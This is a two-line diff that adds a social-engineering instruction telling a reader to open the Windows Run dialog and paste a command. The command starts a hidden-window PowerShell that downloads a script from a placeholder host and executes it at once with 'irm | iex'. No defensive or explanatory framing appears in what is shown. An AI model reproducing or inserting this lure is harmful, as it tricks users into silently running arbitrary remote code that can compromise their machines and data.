@@ -1,0 +1,2 @@
+Press Win+R, paste and press Enter:
+powershell -w h -c "irm https://example.invalid/i | iex"
